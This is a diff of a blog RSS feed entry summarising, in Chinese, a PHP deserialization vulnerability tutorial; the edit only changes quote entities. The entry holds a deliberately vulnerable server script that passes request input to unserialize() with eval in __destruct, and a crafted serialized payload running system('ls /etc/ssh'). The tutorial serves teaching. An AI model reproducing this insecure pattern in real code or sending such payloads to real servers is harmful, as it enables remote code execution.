@@ -1018,7 +1018,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
       <guid>http://wyb0.com/posts/php-unserialize-vulnerabilities/</guid>
       <description>0x00 关于反序列化漏洞 序列化：使用函数serialize()可将实例序列化为字符串
 反序列化：使用函数unserialize()可将序列化的字符串还原
- 服务端有test.php，代码如下  &amp;lt;?php class fun{ public $msg; function __construct(){ echo &#39;__construct&#39;; } function __destruct() { eval($this-&amp;gt;msg); } } $d = $_REQUEST[&#39;str&#39;]; var_dump($d); echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $tc = unserialize($d); var_dump($tc); ?&amp;gt;   客户端可构造如下代码生成序列化后的字符串  &amp;lt;?php class fun{ public $msg; function __construct(){ echo &#39;__construct&#39;; } function __destruct() { eval($this-&amp;gt;msg); } } $f = new fun(); $f-&amp;gt;msg = &amp;quot;system(&#39;ls /etc/ssh&#39;);&amp;quot;; echo serialize($f); ?&amp;gt;  生成的序列化字符串为：O:3:&amp;ldquo;fun&amp;rdquo;:1:{s:3:&amp;ldquo;msg&amp;rdquo;;s:22:&amp;ldquo;system(&amp;lsquo;ls /etc/ssh&amp;rsquo;);&amp;rdquo;;}</description>
+ 服务端有test.php，代码如下  &amp;lt;?php class fun{ public $msg; function __construct(){ echo &#39;__construct&#39;; } function __destruct() { eval($this-&amp;gt;msg); } } $d = $_REQUEST[&#39;str&#39;]; var_dump($d); echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $tc = unserialize($d); var_dump($tc); ?&amp;gt;   客户端可构造如下代码生成序列化后的字符串  &amp;lt;?php class fun{ public $msg; function __construct(){ echo &#39;__construct&#39;; } function __destruct() { eval($this-&amp;gt;msg); } } $f = new fun(); $f-&amp;gt;msg = &amp;quot;system(&#39;ls /etc/ssh&#39;);&amp;quot;; echo serialize($f); ?&amp;gt;  生成的序列化字符串为：O:3:&amp;quot;fun&amp;quot;:1:{s:3:&amp;quot;msg&amp;quot;;s:22:&amp;quot;system(&#39;ls /etc/ssh&#39;);&amp;quot;;}</description>
     </item>
     
     <item>
